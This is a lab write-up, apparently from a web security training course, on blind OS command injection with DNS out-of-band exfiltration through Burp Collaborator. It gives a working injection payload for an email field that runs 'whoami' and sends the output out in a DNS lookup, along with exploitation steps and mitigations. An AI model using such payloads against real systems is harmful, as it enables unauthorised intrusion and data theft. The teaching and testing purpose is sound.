# Lab 05 – Blind OS Command Injection with Out-of-Band Data Exfiltration

## Lab Overview

**Objective**

Use Out-of-Band Application Security Testing (OAST) to retrieve the output of an injected operating system command through a DNS request.

Unlike the previous lab, this exercise confirms execution and extracts command output.

---

# Vulnerability

The application is vulnerable to Blind OS Command Injection.

Command output is not returned in the HTTP response, so the attacker embeds the output into a DNS lookup sent to Burp Collaborator.

---

# Reconnaissance

1. Open the feedback form.
2. Intercept the submission request.
3. Generate a Burp Collaborator payload.

---

# Exploitation

Modify the email parameter.

Original:

```text
user@example.com
```

Modified:

```text
||nslookup `whoami`.BURP-COLLABORATOR-SUBDOMAIN||
```

Replace `BURP-COLLABORATOR-SUBDOMAIN` with the generated Collaborator domain.

Submit the request.

---

# Verify the Interaction

Open the **Burp Collaborator** client.

Click **Poll now** to retrieve interactions.

---

# Successful Result

The recorded DNS request contains the output of the `whoami` command as part of the queried domain.

Example:

```text
wwwuser.BURP-COLLABORATOR-SUBDOMAIN
```

The username confirms both successful command execution and successful retrieval of command output.

---

# Why It Works

The shell first executes:

```bash
whoami
```

The resulting output is inserted into the `nslookup` command.

The operating system then performs a DNS lookup using the generated hostname, allowing Burp Collaborator to capture the command output.

---

# Impact

This technique enables attackers to retrieve command output even when:

- No HTTP output is returned.
- Files cannot be written.
- Commands execute asynchronously.

---

# Mitigation

- Eliminate unnecessary operating system command execution.
- Validate all user input using strict allowlists.
- Restrict unnecessary outbound DNS and network communication where possible.

---

# Bug Bounty Methodology

1. Confirm Blind Command Injection.
2. Generate a Burp Collaborator payload.
3. Embed a command inside the DNS lookup.
4. Submit the request.
5. Poll Burp Collaborator.
6. Extract the command output from the recorded DNS interaction.

---

# Key Learnings

- OAST can be used for both detection and data exfiltration.
- Burp Collaborator provides a reliable mechanism for observing outbound DNS requests.
- Embedding command output into DNS queries allows information to be recovered without relying on application responses.